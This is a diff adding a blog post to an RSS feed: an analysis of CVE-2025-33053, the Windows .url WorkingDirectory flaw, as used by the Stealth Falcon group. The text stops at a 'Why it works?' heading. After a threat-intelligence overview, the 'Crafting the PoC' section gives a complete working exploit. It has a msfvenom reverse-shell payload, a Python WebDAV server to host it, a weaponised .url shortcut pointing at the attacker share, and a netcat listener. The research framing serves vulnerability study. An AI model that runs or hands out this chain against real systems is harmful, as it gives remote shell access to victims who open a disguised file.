@@ -1,5 +1,328 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Arkaprabha Chakraborty</title><link>/</link><description>Arkaprabha Chakraborty</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><managingEditor>arkaprabhachakraborty2001@gmail.com
-(Arkaprabha Chakraborty)</managingEditor><lastBuildDate>Sun, 06 Oct 2024 00:00:00 +0000</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>Peculiar Pentest Scenes - Client-side HTTP Encryption Folly</title><link>/blog/peculiar_pentest_scenes_1/</link><pubDate>Sun, 06 Oct 2024 00:00:00 +0000</pubDate><author>arkaprabhachakraborty2001@gmail.com (Arkaprabha Chakraborty)</author><guid>/blog/peculiar_pentest_scenes_1/</guid><description>&lt;p>Hello fellow researcher! Welcome to the &lt;em>&lt;strong>Chapter 1&lt;/strong>&lt;/em> of &lt;em>&lt;strong>Peculiar Pentest Scenes&lt;/strong>&lt;/em> series of blogs, where I take you through weird situations that I have encountered while being in different penetration testing engagements. In this post, I&amp;rsquo;m going to take you through &lt;strong>Client-side HTTP Encryption&lt;/strong> and it&amp;rsquo;s nuances, how easy it can be to exploit web and mobile applications implementing this &lt;em>feature&lt;/em>, and what are the possible &lt;em>right/correct&lt;/em> ways to do it.&lt;/p>
+(Arkaprabha Chakraborty)</managingEditor><lastBuildDate>Sun, 06 Oct 2024 00:00:00 +0000</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>CVE-2025-33053 Analysis</title><link>/blog/CVE-2025-33053-Analysis/</link><pubDate>Sun, 06 Oct 2024 00:00:00 +0000</pubDate><author>arkaprabhachakraborty2001@gmail.com (Arkaprabha Chakraborty)</author><guid>/blog/CVE-2025-33053-Analysis/</guid><description>&lt;h2 id="introduction" >
+&lt;div>
+&lt;a href="#introduction">
+#
+&lt;/a>
+Introduction
+&lt;/div>
+&lt;/h2>
+&lt;p>Hello fellow researcher! In this blogpost, we are going to do a deep analysis of &lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33053">CVE-2025-33053&lt;/a>. How this simple yet sneaky tactic was/is being used by APT Group Stealth Falcon. &lt;a href="https://malpedia.caad.fkie.fraunhofer.de/actor/stealth_falcon">Stealth Falcon&lt;/a>, also known as Project Raven, G0038, and FruityArmor, is a cyberespionage group linked to the United Arab Emirates (UAE). They have been active since at least 2012, targeting political activists, journalists, and dissidents primarily in the Middle East, including the UAE, as well as individuals and entities in countries like the Netherlands, Saudi Arabia, Thailand, and the United Kingdom.&lt;/p>
+&lt;p>While there&amp;rsquo;s no definitive proof, &lt;a href="https://attack.mitre.org/groups/G0038/">MITRE ATT&amp;amp;CK&lt;/a> says that circumstantial evidence suggests a potential connection between Stealth Falcon and the UAE government. Researchers like Citizen Lab have published reports detailing the group&amp;rsquo;s tactics, techniques, and procedures (TTPs), which include spear-phishing attacks, PowerShell macros, URL shorteners, and social engineering. Some reports also link Stealth Falcon to Project Raven, an initiative allegedly involving former NSA operatives.&lt;/p>
+&lt;h2 id="cve-details" >
+&lt;div>
+&lt;a href="#cve-details">
+#
+&lt;/a>
+CVE Details
+&lt;/div>
+&lt;/h2>
+&lt;p>&lt;strong>NVD:&lt;/strong> External control of file name or path in Internet Shortcut Files allows an unauthorized attacker to execute code over a network.&lt;/p>
+&lt;p>&lt;strong>MSRC:&lt;/strong> While Microsoft has announced retirement of the Internet Explorer 11 application on certain platforms and the Microsoft Edge Legacy application is deprecated, the underlying MSHTML, EdgeHTML, and scripting platforms are still supported. The MSHTML platform is used by Internet Explorer mode in Microsoft Edge as well as other applications through WebBrowser control. The EdgeHTML platform is used by WebView and some UWP applications. The scripting platforms are used by MSHTML and EdgeHTML but can also be used by other legacy applications. Updates to address vulnerabilities in the MSHTML platform and scripting engine are included in the IE Cumulative Updates; EdgeHTML and Chakra changes are not applicable to those platforms.&lt;/p>
+&lt;h2 id="stealth-falcon-attack-strategy" >
+&lt;div>
+&lt;a href="#stealth-falcon-attack-strategy">
+#
+&lt;/a>
+Stealth Falcon Attack Strategy
+&lt;/div>
+&lt;/h2>
+&lt;p>According Checkpoint&amp;rsquo;s research, the following are the steps involved in Stealth Falcon&amp;rsquo;s attack strategy.&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>Initial Compromise&lt;/strong>&lt;/p>
+&lt;p>&amp;ndash; Stealth Falcon initiates attacks through sophisticated phishing email campaigns that contain ZIP archive attachments designed to bypass email security filters&lt;/p>
+&lt;p>&amp;ndash; The threat actors pack malicious &lt;code>.url&lt;/code> files as legitimate PDF documents within the ZIP file to bypass Mark of the Web and smart screen related checks&lt;/p>
+&lt;p>&amp;ndash; The attack chain is designed to require minimal user interaction, typically just a double-click on what appears to be a standard PDF file&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>CVE-2025-33053 Exploitation&lt;/strong>
+&amp;ndash; The core vulnerability exploitation involves manipulating the WorkingDirectory parameter in malicious &lt;code>.url&lt;/code> files to point to attacker-controlled WebDAV servers&lt;/p>
+&lt;p>&amp;ndash; Stealth Falcon leverages Windows&amp;rsquo; Dynamic Link Library search order mechanism to hijack the loading process and force the system to load malicious executables before legitimate ones&lt;/p>
+&lt;p>&amp;ndash; The attack successfully bypasses Windows System32 directory protections by ensuring the malicious &lt;code>route.exe&lt;/code> is discovered and loaded before the legitimate system executable&lt;/p>
+&lt;p>&amp;ndash; This technique achieves fileless execution by loading malicious code directly from remote WebDAV shares without dropping any persistent files on the victim&amp;rsquo;s local filesystem&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Streamlined Multi-Layer Attack Implementation&lt;/strong>&lt;/p>
+&lt;p>&amp;ndash; &lt;strong>Two-Stage Payload Deployment:&lt;/strong> Employs Horus Loader for initial access with anti-analysis capabilities, followed by Horus Agent (Mythic-based implant) that injects into legitimate processes like msedge.exe while displaying decoy PDFs to maintain stealth.&lt;/p>
+&lt;p>&amp;ndash; &lt;strong>Advanced Evasion Framework:&lt;/strong> Implements Code Virtualizer protection, manual DLL mapping, and scans for 100+ security processes. Uses custom OLLVM obfuscation, string encryption, control flow flattening, and API hashing to prevent reverse engineering.&lt;/p>
+&lt;p>&amp;ndash; &lt;strong>IPfuscation Steganography:&lt;/strong> Conceals payload components within IPv6 address structures to evade network-based detection systems, demonstrating sophisticated understanding of security monitoring blind spots.&lt;/p>
+&lt;p>&amp;ndash; &lt;strong>Resilient C2 Infrastructure:&lt;/strong> Secures communications with AES-256 encryption and HMAC-SHA256 integrity verification across multiple domains (up to 4 servers) for operational redundancy and takedown resistance.&lt;/p>
+&lt;p>&amp;ndash; &lt;strong>Comprehensive Espionage Platform:&lt;/strong> Conducts detailed system fingerprinting and environment analysis while maintaining long-term persistence through remote command execution, file operations, and shellcode injection for intelligence gathering.&lt;/p>
+&lt;p>&amp;ndash; &lt;strong>Living-Off-The-Land Integration:&lt;/strong> Leverages legitimate Windows functionality and processes to maintain operational security, making detection significantly more challenging for traditional security tools and analysts.&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;pre class="mermaid">flowchart LR
+subgraph Col1 ["Initial Attack Vector"]
+direction TB
+A["📧 Phishing Email&lt;br/>🔗 ZIP Attachment&lt;br/>📎 Social Engineering"]
+B["📦 Victim Opens Archive&lt;br/>🗂️ Extracts Contents&lt;br/>👁️ Sees 'PDF' File"]
+C["🎭 Malicious LM.005 TELESCOPIC MAST DAMAGE REPORT.pdf.url File&lt;br/>📄 Disguised as PDF&lt;br/>⚠️ Contains WebDAV Path"]
+D["👆 User Double-Clicks&lt;br/>🚀 Triggers Execution&lt;br/>⏰ Attack Initiated"]
+A --> B --> C --> D
+style A fill:#2d3436,stroke:#636e72,color:#ddd
+style B fill:#34495e,stroke:#7f8c8d,color:#ecf0f1
+style C fill:#e17055,stroke:#d63031,color:#fff
+style D fill:#f39c12,stroke:#e67e22,color:#2d3436
+end
+subgraph Col2 ["Windows Shell Processing"]
+direction TB
+E["Windows Shell Invoked&lt;br/> Parses LM.005 TELESCOPIC MAST DAMAGE REPORT.pdf.url File&lt;br/>Reads Parameters"]
+F["ShellExecuteEx API&lt;br/> SHELLEXECUTEINFO Struct&lt;br/> lpDirectory Parameter"]
+G["WorkingDirectory Set to Remote WebDav Share&lt;br/>"]
+H["iediagcmd.exe Launched&lt;br/> Process Created with &lt;/br> Remote Working Directory &lt;br/>"]
+E --> F --> G --> H
+style E fill:#2c3e50,stroke:#34495e,color:#ecf0f1
+style F fill:#16a085,stroke:#1abc9c,color:#2d3436
+style G fill:#00b894,stroke:#00cec9,color:#2d3436
+style H fill:#0984e3,stroke:#74b9ff,color:#fff
+end
+subgraph Col3 ["Exploitation"]
+direction TB
+I["⚠️ DLL Search Order Attack&lt;br/>🔍 Windows LoadLibrary&lt;br/>📋 Search Algorithm Abused"]
+J["❌ Step 1: Current Directory&lt;br/>🔎 Searches WebDAV Path&lt;br/>🚫 NO route.exe Found"]
+K["✅ Step 2: Remote Loading&lt;br/>📥 Malicious route.exe Found&lt;br/>🎭 Loaded from WebDAV"]
+L["🛡️ System32 Bypassed&lt;br/>💀 Malicious Code Executed&lt;br/>🏆 Exploit Successful"]
+I --> J --> K --> L
+style I fill:#c0392b,stroke:#e74c3c,color:#fff
+style J fill:#d35400,stroke:#e67e22,color:#fff
+style K fill:#e17055,stroke:#fd79a8,color:#2d3436
+style L fill:#8e44ad,stroke:#9b59b6,color:#fff
+end
+subgraph Col4 ["🔧 Stage 1: Horus Loader"]
+direction TB
+M["🐍 Horus Loader Activated&lt;br/>🛡️ Anti-Analysis Suite&lt;br/>🔒 Code Virtualizer"]
+N["🛡️ Evasion Techniques&lt;br/>🔍 Scans 100+ AV Processes&lt;br/>🧩 Manual DLL Mapping"]
+O["📄 Decoy PDF Displayed&lt;br/>👁️ User Distraction&lt;br/>🎭 Maintains Legitimacy"]
+P["🔢 IPfuscation Technique&lt;br/>🌐 IPv6 Address Decoding&lt;br/>📦 Payload Extraction"]
+M --> N --> O --> P
+style M fill:#27ae60,stroke:#2ecc71,color:#2d3436
+style N fill:#f39c12,stroke:#f1c40f,color:#2d3436
+style O fill:#95a5a6,stroke:#bdc3c7,color:#2d3436
+style P fill:#e67e22,stroke:#d35400,color:#fff
+end
+subgraph Col5 ["💉 Stage 2: Payload Inject"]
+direction TB
+Q["🎯 Target: msedge.exe&lt;br/>💉 Process Injection&lt;br/>🔧 Advanced Techniques"]
+R["⚡ System Call Arsenal&lt;br/>📋 ZwAllocateVirtualMemory&lt;br/>✍️ ZwWriteVirtualMemory&lt;br/>▶️ NtResumeThread"]
+S["🤖 Horus Agent Deployed&lt;br/>🔗 Mythic-Based Implant&lt;br/>🎭 Heavy Obfuscation"]
+T["🛡️ Protection Layers&lt;br/>🔀 OLLVM Techniques&lt;br/>🔐 String Encryption&lt;br/>🌀 Control Flow Flattening"]
+Q --> R --> S --> T
+style Q fill:#6c5ce7,stroke:#a29bfe,color:#fff
+style R fill:#fd79a8,stroke:#fdcb6e,color:#2d3436
+style S fill:#2d3436,stroke:#636e72,color:#ddd
+style T fill:#00cec9,stroke:#55efc4,color:#2d3436
+end
+subgraph Col6 ["🌐 Persistent Operations"]
+direction TB
+U["📋 Agent Registration&lt;br/>🖥️ System Fingerprinting&lt;br/>🔍 Environment Analysis"]
+V["📡 C2 Communication&lt;br/>🔗 Multiple Domains&lt;br/>⚡ Encrypted Channels"]
+W["🔐 AES-256 Encryption&lt;br/>✅ HMAC-SHA256 Integrity&lt;br/>🌐 Up to 4 C2 Domains"]
+X["🕵️ Espionage Operations&lt;br/>⚡ Command Execution&lt;br/>📁 File Operations&lt;br/>💉 Shellcode Injection&lt;br/>🔍 System Reconnaissance"]
+U --> V --> W --> X
+style U fill:#2c3e50,stroke:#34495e,color:#ecf0f1
+style V fill:#16a085,stroke:#1abc9c,color:#2d3436
+style W fill:#3742fa,stroke:#5f27cd,color:#fff
+style X fill:#8e44ad,stroke:#9b59b6,color:#fff
+end
+%% Inter-column connections with improved visibility
+Col1 -.->|"🔗 Triggers"| Col2
+Col2 -.->|"⚡ Exploits"| Col3
+Col3 -.->|"🚀 Executes"| Col4
+Col4 -.->|"💉 Injects"| Col5
+Col5 -.->|"📡 Establishes"| Col6
+%% Dark mode-friendly subgraph styling with even spacing
+style Col1 fill:#2d343640,stroke:#e17055,stroke-width:3px
+style Col2 fill:#2d343640,stroke:#0984e3,stroke-width:3px
+style Col3 fill:#2d343640,stroke:#c0392b,stroke-width:3px
+style Col4 fill:#2d343640,stroke:#27ae60,stroke-width:3px
+style Col5 fill:#2d343640,stroke:#6c5ce7,stroke-width:3px
+style Col6 fill:#2d343640,stroke:#2c3e50,stroke-width:3px
+&lt;/pre>
+&lt;h2 id="crafting-the-poc" >
+&lt;div>
+&lt;a href="#crafting-the-poc">
+#
+&lt;/a>
+Crafting the PoC
+&lt;/div>
+&lt;/h2>
+&lt;p>This vulnerability can be exploited by using &lt;strong>ANY&lt;/strong> &lt;a href="https://lolbas-project.github.io">LOLBINS&lt;/a>. The only thing required is that the binary specified within &lt;code>URL&lt;/code> parameter of the &lt;code>.url&lt;/code> file must call the malicious executable file or &lt;code>.dll&lt;/code> in the attacker hosted WebDAV server [More details given below].&lt;/p>
+&lt;p>For this example we are using &lt;a href="https://lolbas-project.github.io/lolbas/Binaries/Iediagcmd">&lt;code>iediagcmd.exe&lt;/code>&lt;/a>.&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>Create an reverse shell payload with the name &lt;code>route.exe&lt;/code>. Msfvenom can be useful! Modify &lt;code>LHOST&lt;/code> and &lt;code>LPORT&lt;/code> parameters to suit your need.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>msfvenom -p windows/shell_reverse_tcp &lt;span style="color:#ff5c57">LHOST&lt;/span>&lt;span style="color:#ff6ac1">=&lt;/span>192.168.10.10 &lt;span style="color:#ff5c57">LPORT&lt;/span>&lt;span style="color:#ff6ac1">=&lt;/span>&lt;span style="color:#ff9f43">9999&lt;/span> -f exe -o route.exe
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Create a webdav server using WSGI-DAV in python by using the following code:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#78787e"># required to be run in sudo mode if port 80 is what you wanna use&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff6ac1">import&lt;/span> os
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff6ac1">import&lt;/span> argparse
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff6ac1">from&lt;/span> wsgidav.wsgidav_app &lt;span style="color:#ff6ac1">import&lt;/span> WsgiDAVApp
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff6ac1">from&lt;/span> wsgidav.fs_dav_provider &lt;span style="color:#ff6ac1">import&lt;/span> FilesystemProvider
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff6ac1">from&lt;/span> cheroot &lt;span style="color:#ff6ac1">import&lt;/span> wsgi
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#78787e"># Configuration&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>HOST &lt;span style="color:#ff6ac1">=&lt;/span> &lt;span style="color:#5af78e">&amp;#34;0.0.0.0&amp;#34;&lt;/span> &lt;span style="color:#78787e"># Listen on all interfaces&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT &lt;span style="color:#ff6ac1">=&lt;/span> &lt;span style="color:#ff9f43">80&lt;/span> &lt;span style="color:#78787e"># WebDAV port&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff6ac1">def&lt;/span> &lt;span style="color:#57c7ff">setup_webdav_config&lt;/span>(share_path):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#5af78e">&amp;#34;&amp;#34;&amp;#34;Configure WSGIDav with the specified share directory.&amp;#34;&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff6ac1">return&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#5af78e">&amp;#34;host&amp;#34;&lt;/span>: HOST,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#5af78e">&amp;#34;port&amp;#34;&lt;/span>: PORT,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#5af78e">&amp;#34;provider_mapping&amp;#34;&lt;/span>: {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#5af78e">&amp;#34;/&amp;#34;&lt;/span>: FilesystemProvider(share_path) &lt;span style="color:#78787e"># Map root to share directory&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#5af78e">&amp;#34;simple_dc&amp;#34;&lt;/span>: {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#5af78e">&amp;#34;user_mapping&amp;#34;&lt;/span>: {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#5af78e">&amp;#34;/&amp;#34;&lt;/span>: &lt;span style="color:#ff6ac1">True&lt;/span> &lt;span style="color:#78787e"># Allow anonymous access to root&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#5af78e">&amp;#34;verbose&amp;#34;&lt;/span>: &lt;span style="color:#ff6ac1">True&lt;/span>, &lt;span style="color:#78787e"># Simplified verbosity&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#5af78e">&amp;#34;property_manager&amp;#34;&lt;/span>: &lt;span style="color:#ff6ac1">True&lt;/span>, &lt;span style="color:#78787e"># Enable property storage&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#5af78e">&amp;#34;lock_storage&amp;#34;&lt;/span>: &lt;span style="color:#ff6ac1">True&lt;/span>, &lt;span style="color:#78787e"># WebDAV locking&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff6ac1">if&lt;/span> __name__ &lt;span style="color:#ff6ac1">==&lt;/span> &lt;span style="color:#5af78e">&amp;#34;__main__&amp;#34;&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#78787e"># Parse command-line arguments&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser &lt;span style="color:#ff6ac1">=&lt;/span> argparse&lt;span style="color:#ff6ac1">.&lt;/span>ArgumentParser(description&lt;span style="color:#ff6ac1">=&lt;/span>&lt;span style="color:#5af78e">&amp;#34;Host a WebDAV share without authentication&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#ff6ac1">.&lt;/span>add_argument(
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#5af78e">&amp;#34;--dir&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff5c57">type&lt;/span>&lt;span style="color:#ff6ac1">=&lt;/span>&lt;span style="color:#ff5c57">str&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> default&lt;span style="color:#ff6ac1">=&lt;/span>&lt;span style="color:#5af78e">&amp;#34;./webdav&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> help&lt;span style="color:#ff6ac1">=&lt;/span>&lt;span style="color:#5af78e">&amp;#34;Directory to share via WebDAV (default: ./webdav)&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> )
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> args &lt;span style="color:#ff6ac1">=&lt;/span> parser&lt;span style="color:#ff6ac1">.&lt;/span>parse_args()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#78787e"># Validate and create share directory&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SHARE_PATH &lt;span style="color:#ff6ac1">=&lt;/span> os&lt;span style="color:#ff6ac1">.&lt;/span>path&lt;span style="color:#ff6ac1">.&lt;/span>abspath(args&lt;span style="color:#ff6ac1">.&lt;/span>dir)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff5c57">print&lt;/span>(&lt;span style="color:#5af78e">f&lt;/span>&lt;span style="color:#5af78e">&amp;#34;Parsed directory: &lt;/span>&lt;span style="color:#5af78e">{&lt;/span>SHARE_PATH&lt;span style="color:#5af78e">}&lt;/span>&lt;span style="color:#5af78e">&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff6ac1">if&lt;/span> &lt;span style="color:#ff6ac1">not&lt;/span> os&lt;span style="color:#ff6ac1">.&lt;/span>path&lt;span style="color:#ff6ac1">.&lt;/span>exists(SHARE_PATH):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff6ac1">try&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> os&lt;span style="color:#ff6ac1">.&lt;/span>makedirs(SHARE_PATH)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> os&lt;span style="color:#ff6ac1">.&lt;/span>chmod(SHARE_PATH, &lt;span style="color:#ff9f43">0o755&lt;/span>) &lt;span style="color:#78787e"># Ensure readable/writable&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff5c57">print&lt;/span>(&lt;span style="color:#5af78e">f&lt;/span>&lt;span style="color:#5af78e">&amp;#34;Created share directory: &lt;/span>&lt;span style="color:#5af78e">{&lt;/span>SHARE_PATH&lt;span style="color:#5af78e">}&lt;/span>&lt;span style="color:#5af78e">&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff6ac1">except&lt;/span> OSError &lt;span style="color:#ff6ac1">as&lt;/span> e:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff5c57">print&lt;/span>(&lt;span style="color:#5af78e">f&lt;/span>&lt;span style="color:#5af78e">&amp;#34;Failed to create directory &lt;/span>&lt;span style="color:#5af78e">{&lt;/span>SHARE_PATH&lt;span style="color:#5af78e">}&lt;/span>&lt;span style="color:#5af78e">: &lt;/span>&lt;span style="color:#5af78e">{&lt;/span>e&lt;span style="color:#5af78e">}&lt;/span>&lt;span style="color:#5af78e">&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit(&lt;span style="color:#ff9f43">1&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#78787e"># Configure and start WebDAV server&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> config &lt;span style="color:#ff6ac1">=&lt;/span> setup_webdav_config(SHARE_PATH)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> app &lt;span style="color:#ff6ac1">=&lt;/span> WsgiDAVApp(config)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> server &lt;span style="color:#ff6ac1">=&lt;/span> wsgi&lt;span style="color:#ff6ac1">.&lt;/span>Server((HOST, PORT), app)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff5c57">print&lt;/span>(&lt;span style="color:#5af78e">f&lt;/span>&lt;span style="color:#5af78e">&amp;#34;Starting WebDAV server on http://&lt;/span>&lt;span style="color:#5af78e">{&lt;/span>HOST&lt;span style="color:#5af78e">}&lt;/span>&lt;span style="color:#5af78e">:&lt;/span>&lt;span style="color:#5af78e">{&lt;/span>PORT&lt;span style="color:#5af78e">}&lt;/span>&lt;span style="color:#5af78e">&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff5c57">print&lt;/span>(&lt;span style="color:#5af78e">f&lt;/span>&lt;span style="color:#5af78e">&amp;#34;Shared directory: &lt;/span>&lt;span style="color:#5af78e">{&lt;/span>SHARE_PATH&lt;span style="color:#5af78e">}&lt;/span>&lt;span style="color:#5af78e">&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff5c57">print&lt;/span>(&lt;span style="color:#5af78e">&amp;#34;No authentication required&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff5c57">print&lt;/span>(&lt;span style="color:#5af78e">&amp;#34;Press Ctrl+C to stop&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff6ac1">try&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> server&lt;span style="color:#ff6ac1">.&lt;/span>start()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff6ac1">except&lt;/span> KeyboardInterrupt:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff5c57">print&lt;/span>(&lt;span style="color:#5af78e">&amp;#34;&lt;/span>&lt;span style="color:#5af78e">\n&lt;/span>&lt;span style="color:#5af78e">Stopping WebDAV server...&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> server&lt;span style="color:#ff6ac1">.&lt;/span>stop()
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Run the &lt;code>webdav.py&lt;/code> script. By default it points to a &lt;code>./webdav&lt;/code> directory and creates a &lt;code>./webdav&lt;/code> directory if it doesn&amp;rsquo;t find any.&lt;/p>
+&lt;pre tabindex="0">&lt;code>sudo python3 webdav.py
+&lt;/code>&lt;/pre>&lt;p>You can move your payload to the webdav directory without shutting down the server. Or if you wanna change the directory to where your reverse shell payload is then you can use the &lt;code>--dir&lt;/code> flag. Choice is yours! Always has been.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>The vulnerability is in the capability of windows to execute PE files using webclient. Create a &lt;code>.url&lt;/code> based file (eg: evil.pdf.url) like the one given below:&lt;/p>
+&lt;pre tabindex="0">&lt;code>[InternetShortcut]
+URL=C:\Program Files\Internet Explorer\iediagcmd.exe
+WorkingDirectory=\\192.168.10.10\webdav
+ShowCommand=7
+IconIndex=13
+IconFile=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
+Modified=20F06BA06D07BD014D
+&lt;/code>&lt;/pre>&lt;p>This file uses &lt;code>iediagcmd.exe&lt;/code> as it&amp;rsquo;s LOLBIN, which in turn calls &lt;code>route.exe&lt;/code> located in the Attacker controlled WebDAV server.
+I have my default share of WebDAV server named as &lt;code>/webdav&lt;/code>, hence the UNC path is &lt;code>\\&amp;lt;ATTACKER_IP aka 192.168.10.10&amp;gt;\webdav&lt;/code>. If your share path is anywhere else you&amp;rsquo;ll have to modify the &lt;code>WorkingDirectory&lt;/code> parameter or the file.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Open a netcat listener on attacker machine.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>nc -vnlp &lt;span style="color:#ff9f43">9999&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In this case the victim has to interact with the file to get a reverse shell.&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;h2 id="why-it-works" >
+&lt;div>
+&lt;a href="#why-it-works">
+#
+&lt;/a>
+Why it works?
+&lt;/div>
+&lt;/h2>
